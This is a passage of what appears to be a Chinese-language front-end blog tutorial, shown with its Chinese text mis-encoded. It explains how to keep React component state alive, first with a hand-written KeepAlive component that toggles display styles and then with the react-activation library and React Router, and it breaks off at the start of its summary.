.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React ç»„ä»¶ç¼“å­˜æŒ‡å—ï¼šä»æ‰‹å†™ KeepAlive åˆ°å®æˆ˜åº”ç”¨</h2>
<p>åœ¨ç°ä»£å‰ç«¯å¼€å‘ä¸­ï¼Œå°¤å…¶æ˜¯ç§»åŠ¨ç«¯ H5 æˆ–æ··åˆ App åœºæ™¯ä¸‹ï¼Œ<strong>ç»„ä»¶çŠ¶æ€ç¼“å­˜</strong>å‡ ä¹æ˜¯ä¸€ä¸ªâ€œåˆšéœ€â€ã€‚è¯•æƒ³è¿™æ ·ä¸€ä¸ªå¸¸è§æµç¨‹ï¼šç”¨æˆ·åœ¨å•†å“åˆ—è¡¨é¡µæ»‘åŠ¨åˆ°ç¬¬ 20 è¡Œï¼Œç‚¹å‡»æŸå•†å“è¿›å…¥è¯¦æƒ…é¡µï¼Œè¿”å›æ—¶å´å‘ç°åˆ—è¡¨å›åˆ°äº†é¡¶éƒ¨ï¼Œç­›é€‰æ¡ä»¶é‡ç½®ï¼ŒåŠ è½½çŠ¶æ€æ¸…é›¶â€”â€”è¿™ç§ä½“éªŒä¸ä»…æ‰“æ–­ç”¨æˆ·å¿ƒæ™ºï¼Œç”šè‡³å¯èƒ½ç›´æ¥å¯¼è‡´æµå¤±ã€‚</p>
<p>Vue æ¡†æ¶é€šè¿‡å†…ç½®çš„Â <code>&lt;keep-alive&gt;</code>Â ç»„ä»¶ä¼˜é›…åœ°è§£å†³äº†è¿™ä¸€é—®é¢˜ï¼Œä½†Â <strong>React å®˜æ–¹å¹¶æœªæä¾›ç­‰æ•ˆçš„åŸç”Ÿèƒ½åŠ›</strong>ã€‚å¼€å‘è€…è¦ä¹ˆæ¥å—â€œåˆ‡æ¢å³é”€æ¯â€çš„é»˜è®¤è¡Œä¸ºï¼Œè¦ä¹ˆè‡ªè¡Œå®ç°ç¼“å­˜é€»è¾‘ï¼Œè¦ä¹ˆå¼•å…¥ç¬¬ä¸‰æ–¹æ–¹æ¡ˆã€‚</p>
<p>é‚£ä¹ˆï¼Œåœ¨ React ä¸­ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•å®ç°ç±»ä¼¼Â <code>&lt;keep-alive&gt;</code>Â çš„åŠŸèƒ½ï¼Ÿ</p>
<ul>
<li>æ˜¯è‡ªå·±åŠ¨æ‰‹é€ è½®å­ï¼Œæ·±å…¥ç†è§£ç¼“å­˜æœºåˆ¶çš„æœ¬è´¨ï¼Ÿ</li>
<li>è¿˜æ˜¯ç›´æ¥é‡‡ç”¨æˆç†Ÿåº“ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ç¨³å®šè½åœ°ï¼Ÿ</li>
</ul>
<p>æœ¬æ–‡å°†åˆ†ä¸¤éƒ¨åˆ†ä¸ºä½ ç³»ç»Ÿè§£ç­”ï¼š</p>
<ol>
<li><strong>åŸç†ç¯‡</strong>ï¼šä»é›¶æ‰‹å†™ä¸€ä¸ªç®€æ˜“Â <code>KeepAlive</code>Â ç»„ä»¶ï¼Œæ­ç¤ºâ€œç¼“å­˜ä¸é”€æ¯â€çš„æ ¸å¿ƒæ€æƒ³ï¼›</li>
<li><strong>å®æˆ˜ç¯‡</strong>ï¼šä½¿ç”¨ä¸šç•Œå¹¿æ³›é‡‡ç”¨çš„Â <code>react-activation</code>Â åº“ï¼Œè§£å†³çœŸå®é¡¹ç›®ä¸­çš„è·¯ç”±ç¼“å­˜ã€æ»šåŠ¨ä½ç½®æ¢å¤ç­‰å¤æ‚åœºæ™¯ï¼Œå¹¶åˆ†äº«è¸©å‘ç»éªŒä¸æœ€ä½³å®è·µã€‚</li>
</ol>
<p>æ— è®ºä½ æ˜¯æƒ³å¤¯å®åŸºç¡€ï¼Œè¿˜æ˜¯äºŸéœ€ä¸Šçº¿åŠŸèƒ½ï¼Œç›¸ä¿¡éƒ½èƒ½ä»ä¸­è·å¾—å®ç”¨ä»·å€¼ã€‚</p>
<hr/>
<h3 data-id="heading-1">ç¬¬ä¸€éƒ¨åˆ†ï¼šæ‰‹å†™ä¸€ä¸ªç®€æ˜“ç‰ˆ KeepAlive</h3>
<p>æ ¸å¿ƒæ€æƒ³éå¸¸ç®€å•ï¼š<strong>ä¸è¦é”€æ¯ç»„ä»¶ï¼Œåªæ˜¯æŠŠå®ƒä»¬è—èµ·æ¥ã€‚</strong></p>
<p>å½“ç”¨æˆ·åˆ‡æ¢ Tab æ—¶ï¼Œæ™®é€šçš„ React æ¡ä»¶æ¸²æŸ“ï¼ˆ<code>{show &amp;&amp; &lt;Component /&gt;}</code>ï¼‰ä¼šè§¦å‘ç»„ä»¶çš„å¸è½½ï¼ˆUnmountï¼‰ã€‚è€Œæˆ‘ä»¬çš„ KeepAlive ç»„ä»¶ä¼šå°†æ‰€æœ‰æ¸²æŸ“è¿‡çš„ç»„ä»¶éƒ½å­˜åœ¨ä¸€ä¸ª <code>Map</code>ï¼ˆå¯¹è±¡ï¼‰é‡Œï¼Œæ ¹æ®å½“å‰æ¿€æ´»çš„ IDï¼Œæ§åˆ¶å®ƒä»¬çš„ <code>display</code> æ ·å¼ã€‚</p>
<h4 data-id="heading-2">1. æ ¸å¿ƒä»£ç å®ç°</h4>
<p>çœ‹çœ‹æ˜¯æ€ä¹ˆå†™çš„ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> { useState, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAlive</span> = (<span class="hljs-params">{ activeId, children }</span>) =&gt; {
  <span class="hljs-comment">// 1. æ ¸å¿ƒæ•°æ®ç»“æ„ï¼šç¼“å­˜å®¹å™¨</span>
  <span class="hljs-comment">// ç”¨ä¸€ä¸ªå¯¹è±¡æ¥å­˜å‚¨æ‰€æœ‰æ¸²æŸ“è¿‡çš„ childrenï¼Œkey æ˜¯ activeId</span>
  <span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>({});

  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// 2. ç›‘å¬å˜åŒ–ï¼šä¸€æ—¦ activeId å˜äº†ï¼Œæˆ–è€… children å˜äº†</span>
    <span class="hljs-comment">// å¦‚æœè¿™ä¸ª activeId å¯¹åº”çš„ç»„ä»¶è¿˜æ²¡ç¼“å­˜è¿‡ï¼Œå°±æŠŠå®ƒå­˜è¿›å»</span>
    <span class="hljs-keyword">if</span> (!cache[activeId]) {
      <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> ({
        ...prev,
        [activeId]: children
      }))
    }
  }, [activeId, children, cache])

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      {
        // 3. æ¸²æŸ“æ‰€æœ‰ç¼“å­˜ï¼šåˆ©ç”¨ Object.entries éå†ç¼“å­˜å¯¹è±¡
        // å…³é”®ç‚¹ï¼šæ‰€æœ‰ç»„ä»¶éƒ½æ¸²æŸ“å‡ºæ¥äº†ï¼Œåªæ˜¯é€šè¿‡ display æ§åˆ¶æ˜¾éš
        Object.entries(cache).map(([id, component]) =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> 
            <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span>
            // <span class="hljs-attr">4.</span> <span class="hljs-attr">æ ·å¼æ§åˆ¶</span>ï¼š<span class="hljs-attr">å¦‚æœæ˜¯å½“å‰æ¿€æ´»çš„</span> <span class="hljs-attr">id</span>ï¼Œ<span class="hljs-attr">å°±</span> <span class="hljs-attr">block</span>ï¼Œ<span class="hljs-attr">å¦åˆ™</span> <span class="hljs-attr">none</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>'<span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>'}}
          &gt;</span>
            {component}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        ))
      }
    <span class="hljs-tag">&lt;/&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-3">æ ¸å¿ƒä»£ç è§£æ</h4>
<ol>
<li><code>const [cache, setCache] = useState({});</code> ä½¿ç”¨çŠ¶æ€ç®¡ç†æ¥ç¼“å­˜å·²ç»æ¸²æŸ“è¿‡çš„ç»„ä»¶</li>
<li><code>useEffect</code>ï¼Œä½¿ç”¨å‰¯ä½œç”¨hookæ›´æ–°ç¼“å­˜ï¼Œå¦‚æœå½“å‰å…ƒç´ è¿˜æ²¡æœ‰åŠ è½½è¿‡é‚£å°±å­˜å…¥ç¼“å­˜</li>
<li><code> Object.entries</code> ï¼šèƒ½å¤Ÿå°†é”®å€¼å¯¹å¯¹è±¡è½¬æ¢ä¸º<code>[key,value]</code>çš„æ•°ç»„ï¼Œä¾‹å¦‚{id:1}ä¼šè¢«è½¬æ¢ä¸º<code>['id',1]</code>,è¿™é‡Œé€šè¿‡è§£æ„æ‹¿åˆ°è¢«keepAliveç»„ä»¶åŒ…è£¹çš„ç»„ä»¶å…ƒç´ ï¼Œç„¶åé€šè¿‡æ ·å¼æ§åˆ¶æ¥æ§åˆ¶å¯¹åº”ç»„ä»¶çš„æ˜¾ç¤ºã€‚</li>
</ol>
<h4 data-id="heading-4">2. ä½¿ç”¨æ•ˆæœ</h4>
<p>åœ¨éœ€è¦çš„ç»„ä»¶ä¸­ä½¿ç”¨å®ƒï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">import</span> {
  useState,
  useEffect
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">KeepAlive</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./components/KeepAlive.jsx'</span>


<span class="hljs-keyword">const</span> <span class="hljs-title function_">Counter</span> = (<span class="hljs-params">{name}</span>)=&gt;{
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æŒ‚è½½"</span>,name)
    <span class="hljs-keyword">return</span> <span class="hljs-function">()=&gt;</span>{
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¸è½½"</span>,name)
    }
  },[])
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{padding:</span>'<span class="hljs-attr">20px</span>',<span class="hljs-attr">border:</span>'<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>'}}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{name}è§†å›¾<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰è®¡æ•°: {count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span>=&gt;</span>setCount(count+1)}&gt;åŠ ä¸€<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
<span class="hljs-keyword">const</span> <span class="hljs-title function_">OtherCounter</span> = (<span class="hljs-params">{name}</span>)=&gt;{
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">()=&gt;</span>{
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æŒ‚è½½"</span>,name)
    <span class="hljs-keyword">return</span> <span class="hljs-function">()=&gt;</span>{
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å¸è½½"</span>,name)
    }
  },[])
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{padding:</span>'<span class="hljs-attr">20px</span>',<span class="hljs-attr">border:</span>'<span class="hljs-attr">1px</span> <span class="hljs-attr">solid</span> #<span class="hljs-attr">ccc</span>'}}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{name}è§†å›¾<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰è®¡æ•°: {count}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span>=&gt;</span>setCount(count+1)}&gt;åŠ ä¸€<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>)=&gt;{
  <span class="hljs-keyword">const</span> [activeTab, setActiveTab] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'A'</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{marginBottom:</span>'<span class="hljs-attr">20px</span>'}}&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span>=&gt;</span>setActiveTab('A')}&gt;æ˜¾ç¤ºAç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span>=&gt;</span>setActiveTab('B')}&gt;æ˜¾ç¤ºBç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      {/* children åœ¨reactä¸­æ˜¯ç”¨æ¥æå‡ç»„ä»¶çš„å®šåˆ¶èƒ½åŠ› çˆ¶ç»„ä»¶æ–¹ä¾¿ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">KeepAlive</span> <span class="hljs-attr">activeId</span>=<span class="hljs-string">{activeTab}</span>&gt;</span>
        {activeTab === 'A'? <span class="hljs-tag">&lt;<span class="hljs-name">Counter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'A'</span>/&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">OtherCounter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'B'</span>/&gt;</span>}
      <span class="hljs-tag">&lt;/<span class="hljs-name">KeepAlive</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>

</code></pre>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">KeepAlive</span> activeId={activeTab}&gt;
  {activeTab === <span class="hljs-string">'A'</span> ? <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Counter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'A'</span>/&gt;</span></span> : <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">OtherCounter</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'B'</span>/&gt;</span></span>}
&lt;/<span class="hljs-title class_">KeepAlive</span>&gt;
</code></pre>
<p><strong>æ•ˆæœ</strong>ï¼š</p>
<ul>
<li>å½“ä½ ç‚¹å‡»â€œæ˜¾ç¤º A ç»„ä»¶â€ï¼Œè®¡æ•°å™¨åŠ åˆ° 5ã€‚</li>
<li>åˆ‡æ¢åˆ° B ç»„ä»¶ï¼Œå†åˆ‡å› A ç»„ä»¶ã€‚</li>
<li><strong>A ç»„ä»¶çš„è®¡æ•°å™¨ä¾ç„¶æ˜¯ 5</strong>ï¼Œè€Œä¸”æ§åˆ¶å°ä¸ä¼šæ‰“å°â€œå¸è½½ Aâ€ã€‚</li>
<li>è¿™å°±å®ç°äº†æœ€åŸºç¡€çš„<strong>çŠ¶æ€ä¿ç•™</strong>ã€‚</li>
</ul>
<h3 data-id="heading-5"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6c2debee41e474f8d9b17ea11dbf7a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270886&amp;x-signature=TxBAcL2MdzI8HKpMjC4uPpYa4NE%3D" alt="20260129-0520-34.0468753.gif" loading="lazy"/></h3>
<h3 data-id="heading-6">ç¬¬äºŒéƒ¨åˆ†ï¼šç”Ÿäº§ç¯å¢ƒå®æˆ˜ (react-activation)</h3>
<p>æ‰‹å†™çš„ç‰ˆæœ¬è™½ç„¶èƒ½ç”¨ï¼Œä½†åœ¨å¤æ‚çš„è·¯ç”±åœºæ™¯ï¼ˆReact Routerï¼‰ä¸‹å¾€å¾€åŠ›ä¸ä»å¿ƒã€‚åœ¨çœŸå®é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸ä½¿ç”¨æˆç†Ÿçš„ç¬¬ä¸‰æ–¹åº“ï¼Œæ¯”å¦‚ <code>react-activation</code>ã€‚</p>
<h4 data-id="heading-7">1. å¼•å…¥ç¬¬ä¸‰æ–¹åº“</h4>
<p>ç›´æ¥ä½¿ç”¨å°è£…å¥½çš„ç¬¬ä¸‰æ–¹åº“ç»„ä»¶ï¼Œä¸æ‰‹å†™å®ç°ä¸åŒçš„æ˜¯ï¼šç¬¬ä¸‰æ–¹åº“çš„é€»è¾‘æ˜¯ï¼š â€œéª—â€è¿‡ React ã€‚
è®© React ä»¥ä¸ºç»„ä»¶ä¸€ç›´å®‰ç¨³åœ°å¾…åœ¨é¡¶å±‚ï¼Œè€Œå®é™…ä¸Šé€šè¿‡åº•å±‚ DOM æ“ä½œï¼ŒæŠŠå®ƒçš„â€œè‚‰èº«â€ï¼ˆDOM èŠ‚ç‚¹ï¼‰æŒ‰éœ€ç§»åŠ¨åˆ°ç”¨æˆ·çœ‹å¾—åˆ°çš„åœ°æ–¹ã€‚</p>
<p>åœ¨æˆ‘ä»¬çš„ç§»åŠ¨ç«¯é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å°è£…äº†ä¸€ä¸ª <code>KeepAliveHome</code> ç»„ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/components/KeepAliveHome.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">KeepAlive</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'react-activation'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/pages/Home'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title function_">KeepAliveHome</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">return</span> (
        <span class="hljs-comment">// name: ç¼“å­˜çš„å”¯ä¸€æ ‡è¯†</span>
        <span class="hljs-comment">// saveScrollPosition="screen": è‡ªåŠ¨ä¿å­˜å¹¶æ¢å¤æ»šåŠ¨ä½ç½®</span>
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">KeepAlive</span> <span class="hljs-attr">name</span>=<span class="hljs-string">'home'</span> <span class="hljs-attr">saveScrollPosition</span>=<span class="hljs-string">"screen"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Home</span>/&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">KeepAlive</span>&gt;</span></span>
    )
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">KeepAliveHome</span>
</code></pre>
<h5 data-id="heading-8">æ ¸å¿ƒé€»è¾‘ï¼šPortal â€œä¹¾å¤å¤§æŒªç§»â€</h5>
<ol>
<li>
<p><strong>å½±å­å®¹å™¨ï¼ˆ<code>AliveScope</code>ï¼‰</strong><br/>
åº“ä¼šåœ¨åº”ç”¨é¡¶å±‚åˆ›å»ºä¸€ä¸ªä¸å¯è§çš„å®¹å™¨ï¼ˆé€šå¸¸åŒ…è£¹æ•´ä¸ªåº”ç”¨ï¼‰ï¼Œç§°ä¸ºÂ <code>AliveScope</code>ï¼Œå¯ç†è§£ä¸ºç»„ä»¶çš„â€œä¼‘çœ èˆ±â€ã€‚</p>
</li>
<li>
<p><strong>åŠ«æŒæ¸²æŸ“ï¼ˆPortalï¼‰</strong><br/>
å½“ä½ å†™Â <code>&lt;KeepAlive&gt;&lt;Home /&gt;&lt;/KeepAlive&gt;</code>Â æ—¶ï¼Œ<code>&lt;Home /&gt;</code>Â å¹¶ä¸ä¼šæ¸²æŸ“åœ¨å½“å‰ä½ç½®ï¼Œè€Œæ˜¯é€šè¿‡Â <code>ReactDOM.createPortal</code>Â æ¸²æŸ“åˆ°Â <code>AliveScope</code>Â ä¸­ã€‚</p>
</li>
<li>
<p><strong>å ä½ç¬¦ï¼ˆPlaceholderï¼‰</strong><br/>
åŸä½ç½®åªä¿ç•™ä¸€ä¸ªç©ºçš„Â <code>&lt;div&gt;</code>Â æˆ–æ³¨é‡ŠèŠ‚ç‚¹ä½œä¸ºå ä½ã€‚</p>
</li>
<li>
<p><strong>æ¬è¿ DOMï¼ˆTeleportationï¼‰</strong></p>
<ul>
<li><strong>æ˜¾ç¤ºæ—¶</strong>ï¼šå°†Â <code>AliveScope</code>Â ä¸­çš„çœŸå® DOM èŠ‚ç‚¹Â <code>appendChild</code>Â åˆ°å ä½ç¬¦å¤„ï¼›</li>
<li><strong>éšè—æ—¶</strong>ï¼ˆå¦‚åˆ‡æ¢è·¯ç”±ï¼‰ï¼šå°†è¯¥èŠ‚ç‚¹ç§»å›Â <code>AliveScope</code>Â å­˜å‚¨ã€‚</li>
</ul>
</li>
</ol>
<h5 data-id="heading-9">ä¸ºä»€ä¹ˆè¿™ä¹ˆåšï¼Ÿ</h5>
<p>å› ä¸º React ç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸä¸å…¶åœ¨Â <strong>è™šæ‹Ÿ DOM æ ‘ä¸­çš„ä½ç½®</strong>Â ç»‘å®šï¼š</p>
<ul>
<li>æ™®é€šæ¡ä»¶æ¸²æŸ“ä¼šå¯¼è‡´ç»„ä»¶æ ‘ä½ç½®å˜åŒ– â†’ React å¸è½½ç»„ä»¶ï¼›</li>
<li>è€Œé€šè¿‡ Portalï¼Œç»„ä»¶åœ¨ React æ ‘ä¸­çš„ä½ç½®Â <strong>å§‹ç»ˆå›ºå®šåœ¨Â <code>AliveScope</code>Â å†…éƒ¨</strong>ï¼Œä»æœªæ”¹å˜ï¼›</li>
<li>å› æ­¤ React è®¤ä¸ºå®ƒâ€œä¸€ç›´æ´»ç€â€ï¼ŒçŠ¶æ€è‡ªç„¶ä¿ç•™ã€‚</li>
</ul>
<blockquote>
<p>ğŸ’¡ æ³¨æ„ï¼šæ­¤å¤„ä»…ä¸ºæ¼”ç¤ºã€‚å®é™…å¼€å‘ä¸­ï¼Œå»ºè®®å°†Â <code>KeepAlive</code>Â å°è£…ä¸ºé€šç”¨é«˜é˜¶ç»„ä»¶ï¼Œé€šè¿‡Â <code>children</code>Â æ¥æ”¶ä»»æ„éœ€ç¼“å­˜çš„å­ç»„ä»¶ã€‚</p>
</blockquote>
<h4 data-id="heading-10">2. é…åˆè·¯ç”±ä½¿ç”¨</h4>
<p>åœ¨è·¯ç”±é…ç½®ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç”¨ <code>AliveScope</code> åŒ…è£¹æ•´ä¸ªåº”ç”¨ï¼ˆé€šå¸¸åœ¨ <code>Router</code> å†…éƒ¨ï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/router/index.tsx</span>
&lt;<span class="hljs-title class_">Router</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">AliveScope</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">"/"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">KeepAliveHome</span> /&gt;</span>} /&gt;
      {/* ... */}
    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">AliveScope</span>&gt;</span></span>
&lt;/<span class="hljs-title class_">Router</span>&gt;
</code></pre>
<p>å½“æˆ‘ä»¬æµè§ˆæ—¶ï¼Œå³ä½¿ä»è¯¦æƒ…é¡µå‡ºæ¥ä¹Ÿä¸ä¼šä»é¡¶éƒ¨é‡æ–°å¼€å§‹çœ‹äº†ï¼Œè€Œæ˜¯åœç•™åœ¨äº†ä¸Šä¸€æ¬¡çš„æµè§ˆä½ç½®
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/835a5009890045d292b40171c3d393cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGh4eHg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270886&amp;x-signature=gyEy%2FKrv65SzpogpElsu4CMmsbs%3D" alt="20260129-0537-14.7884793.gif" loading="lazy"/></p>
<h4 data-id="heading-11">3. é‡åˆ°çš„å‘ä¸æœ€ä½³å®è·µ</h4>
<p>åœ¨ä½¿ç”¨ <code>react-activation</code> æ—¶ï¼Œæœ‰ä¸€ä¸ªéå¸¸å®¹æ˜“è¸©çš„å‘ï¼š<strong>çˆ¶ç»„ä»¶å¸è½½å¯¼è‡´çš„ç¼“å­˜å¤±æ•ˆ</strong>ã€‚</p>
<p>åœ¨ React Router v6 çš„åµŒå¥—è·¯ç”±ä¸­ï¼Œå¦‚æœä½ çš„ç»“æ„æ˜¯ï¼š</p>
<pre><code class="hljs language-jsx" lang="jsx">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">"/"</span> element={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">MainLayout</span> /&gt;</span></span>}&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">{</span>&lt;<span class="hljs-attr">KeepAliveHome</span> /&gt;</span>} /&gt;</span>
&lt;/<span class="hljs-title class_">Route</span>&gt;
</code></pre>
<p>å½“ä½ è·³è½¬åˆ° <code>/detail</code>ï¼ˆä¸€ä¸ªä¸å±äº <code>MainLayout</code> çš„è·¯ç”±ï¼‰æ—¶ï¼Œ<strong><code>MainLayout</code> ä¼šè¢«å¸è½½</strong>ã€‚
æ ¹æ® React çš„è§„åˆ™ï¼Œçˆ¶ç»„ä»¶å¸è½½ï¼Œå­ç»„ä»¶ï¼ˆå“ªæ€•åŒ…äº† KeepAliveï¼‰ä¹Ÿä¼šéšä¹‹é”€æ¯ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<ol>
<li><strong>æå‡å±‚çº§</strong>ï¼šå°½é‡å°†éœ€è¦ç¼“å­˜çš„ç»„ä»¶æ”¾åœ¨è·¯ç”±æ ‘çš„é¡¶å±‚ï¼Œæˆ–è€…ç¡®ä¿å…¶çˆ¶çº§ Layout ä¸ä¼šè½»æ˜“å¸è½½ã€‚</li>
<li><strong>é™æ€å¼•å…¥</strong>ï¼šé¿å…ä½¿ç”¨ <code>React.lazy</code> æ‡’åŠ è½½åŒ…è£¹ KeepAlive ç»„ä»¶ï¼Œæœ‰æ—¶ä¼šå¯¼è‡´ç»„ä»¶å¼•ç”¨å˜åŒ–ä»è€Œé‡ç½®ç¼“å­˜ã€‚</li>
</ol>
<h4 data-id="heading-12">æ€»ç»“</h4>
<p>ç»„ä»¶ç¼“å­˜çœ‹ä¼¼æ˜¯ä¸€ä¸ªå°åŠŸèƒ½ï¼Œå®åˆ™æ·±åˆ»å½±å“ç€ç”¨æˆ·ä½“éªŒä¸å¼€å‘å¤æ‚åº¦ã€‚é€šè¿‡æœ¬æ–‡çš„æ¢ç´¢ï¼Œæˆ‘ä»¬å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ä¸¤ç§å®ç°è·¯å¾„çš„å®šä½ä¸ä»·å€¼ï¼š</p>
<ul>
